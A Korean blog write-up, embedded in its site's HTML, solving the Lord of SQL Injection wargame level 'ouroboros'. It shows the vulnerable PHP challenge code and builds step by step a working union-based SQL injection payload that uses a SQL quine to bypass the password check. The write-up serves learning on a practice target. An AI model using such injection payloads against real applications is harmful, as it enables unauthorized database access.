@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - ouroboros 문제풀이 | mingzzi</title>
+	<meta name="description" content="이번 문제도 테이블이 비어 있었다.근데 pw를 추출하래…어떻게 하라는지 고민하다가 웹짱해커님께 물어봐서 겨우 풀었다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2018/09/17/los-ouroboros.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - ouroboros 문제풀이</h1>
+    
+    <p class="meta">
+      September 17, 2018
+      
+    </p>
+  </header>
+  <section class="post-content"><p>이번 문제도 테이블이 비어 있었다.</p>
+
+<p>근데 <code class="highlighter-rouge">pw</code>를 추출하래…</p>
+
+<p>어떻게 하라는지 고민하다가 웹짱해커님께 물어봐서 겨우 풀었다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------------------------------------------------------------------
+query : select pw from prob_ouroboros where pw=''
+----------------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|rollup|join|@/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from prob_ouroboros where pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Pw : </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"ouroboros"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>첨에는 문제 보자마자 <code class="highlighter-rouge">오?</code> 했다.</p>
+
+<p>그래서 신나게 <code class="highlighter-rouge">?pw=1' or pw like '%'%23</code>을 입력 해 보았다.</p>
+
+<p>그런데 아무런 결과도 나오지 않았다.</p>
+
+<p>보아하니 얘도 테이블을 비워 둔 것 같았다.</p>
+
+<p>그럼.. 내가 입력 한 값이 곧 결과값이 되어야 하는데, 이걸 도저히 어떻게 해야하는지 감이 안잡혔다.</p>
+
+<p><code class="highlighter-rouge">?pw=1' union select '1</code>을 입력하면, <code class="highlighter-rouge">Pw : 1</code>이 출력되서 <code class="highlighter-rouge">뭔가 union을 써야 하는구나...</code>는 알겠는데 어떻게 해야 내가 입력한 값과 출력 값이 같게 만들 수 있는지를 모르겠더라.</p>
+
+<p>그래서 또 다시 <code class="highlighter-rouge">웹 짱 해커</code>님한테 물어봤다.</p>
+
+<p>그랬더니 힌트로 <code class="highlighter-rouge">Quine</code>라는 것을 알려 주었다.</p>
+
+<p><a href="https://en.wikipedia.org/wiki/Quine_(computing)">위키백과 - Quine</a></p>
+
+<p><a href="https://www.shysecurity.com/post/20140705-SQLi-Quine">SQLi Quine</a></p>
+
+<p>인터넷 찾아보니 이 두 가지가 제일 도움이 되었다.</p>
+
+<p>즉, <code class="highlighter-rouge">Quine</code>은 <code class="highlighter-rouge">자기 자신의 소스코드를 출력하는 것</code>을 의미한다고 한다.</p>
+
+<p>이번 문제에 딱 맞는 컨셉이다.</p>
+
+<p>그래서 위의 링크 중에 위키백과에서 아래와 같은 쿼리문을 가져와 테스트 해 보았다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine;
+</code></pre></div></div>
+
+<p>그 결과 내가 입력한 내용이 그대로 결과 값으로 나온 것을 확인할 수 있었다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine; 
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| Quine                                                                                                                                                                                                      |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| SELECT REPLACE(REPLACE('SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine |
++------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<p>이 것을 바탕으로 문제를 풀기 위해 <code class="highlighter-rouge">SELECT</code>를 <code class="highlighter-rouge">a' union SELECT</code>로 변경했다.</p>
+
+<p>그랬더니 <code class="highlighter-rouge">'</code>와 <code class="highlighter-rouge">"</code>이 내가 입력한 값과 조금씩 달라졌다.</p>
+
+<p>왜 바뀌는지 도저히 모르겠어서 <code class="highlighter-rouge">REPLACE</code> 함수를 기준으로 쿼리문을 잘라서 비교 해 보았다.</p>
+
+<p>쿼리를 살펴 보면 <code class="highlighter-rouge">$</code>가 있는데, 앞의 두 <code class="highlighter-rouge">$</code> 자리에 마지막의 <code class="highlighter-rouge">SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine</code>가 <code class="highlighter-rouge">REPLACE</code> 되어 들어가게 된다.</p>
+
+<p>그 과정에서 <code class="highlighter-rouge">"</code>가 <code class="highlighter-rouge">'</code>로 바뀌게 되는데, 나는 쿼리의 시작 부분에서 <code class="highlighter-rouge">a' union SELECT</code>가 필요하므로, 처음에 <code class="highlighter-rouge">a"</code>로 입력하고 이 후 <code class="highlighter-rouge">REPLACE</code> 함수를 실행하는 과정에서 <code class="highlighter-rouge">a'</code>로 바뀌도록 했다.</p>
+
+<p>어차피 뒤의 <code class="highlighter-rouge">a" union SELECT</code> 부분은 실제로 쿼리가 실행되는 부분이 아니어서 상관없기 때문이다.</p>
+
+<p>그 결과 만들어진 쿼리는 아래와 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select pw from user where pw='a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine;
+</code></pre></div></div>
+
+<p>내가 내 서버에서 테스트 한 쿼리인데 너무 복잡해서 알아보기가 힘든 것 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; select pw from user where pw='a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine;
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| pw                                                                                                                                                                                                                                    |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine') AS Quine |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+1 row in set (0.01 sec)
+</code></pre></div></div>
+
+<p>쿼리를 실행 한 결과, 내가 입력 한 쿼리가 그대로 결과 값으로 나온 것을 확인할 수 있다.</p>
+
+<p>드디어 이를 바탕으로 아래와 같은 쿼리스트링을 넘겨주었다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pw=a' union SELECT REPLACE(REPLACE('a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine%23',CHAR(34),CHAR(39)),CHAR(36),'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine%23') AS Quine%23
+</code></pre></div></div>
+
+<p>이 복잡한 쿼리를 통해 드디어 문제를 풀 수 있었다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="nx">query</span> <span class="o">:</span> <span class="nx">select</span> <span class="nx">pw</span> <span class="nx">from</span> <span class="nx">prob_ouroboros</span> <span class="nx">where</span> <span class="nx">pw</span><span class="o">=</span><span class="s1">'a'</span> <span class="nx">union</span> <span class="nx">SELECT</span> <span class="nx">REPLACE</span><span class="p">(</span><span class="nx">REPLACE</span><span class="p">(</span><span class="s1">'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine#'</span><span class="p">,</span><span class="nx">CHAR</span><span class="p">(</span><span class="mi">34</span><span class="p">),</span><span class="nx">CHAR</span><span class="p">(</span><span class="mi">39</span><span class="p">)),</span><span class="nx">CHAR</span><span class="p">(</span><span class="mi">36</span><span class="p">),</span><span class="s1">'a" union SELECT REPLACE(REPLACE("$",CHAR(34),CHAR(39)),CHAR(36),"$") AS Quine#'</span><span class="p">)</span> <span class="nx">AS</span> <span class="nx">Quine</span><span class="c1">#'</span>
+<span class="o">--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+
+<span class="nx">Pw</span> <span class="o">:</span> <span class="nx">a</span><span class="s1">' union SELECT REPLACE(REPLACE('</span><span class="nx">a</span><span class="s2">" union SELECT REPLACE(REPLACE("</span><span class="err">$</span><span class="s2">",CHAR(34),CHAR(39)),CHAR(36),"</span><span class="err">$</span><span class="s2">") AS Quine#',CHAR(34),CHAR(39)),CHAR(36),'a"</span> <span class="nx">union</span> <span class="nx">SELECT</span> <span class="nx">REPLACE</span><span class="p">(</span><span class="nx">REPLACE</span><span class="p">(</span><span class="s2">"$"</span><span class="p">,</span><span class="nx">CHAR</span><span class="p">(</span><span class="mi">34</span><span class="p">),</span><span class="nx">CHAR</span><span class="p">(</span><span class="mi">39</span><span class="p">)),</span><span class="nx">CHAR</span><span class="p">(</span><span class="mi">36</span><span class="p">),</span><span class="s2">"$"</span><span class="p">)</span> <span class="nx">AS</span> <span class="nx">Quine</span><span class="c1">#') AS Quine#</span>
+<span class="nx">OUROBOROS</span> <span class="nx">Clear</span><span class="o">!</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nx">dbconnect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|rollup|join|@/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from prob_ouroboros where pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Pw : </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"ouroboros"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">OUROBOROS Clear!!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2018/09/17/los-ouroboros.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/09/16/los-phantom.html">
+        [Lord of SQL Injection] LoS - phantom 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/09/18/los-zombie.html">
+        [Lord of SQL Injection] LoS - zombie 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
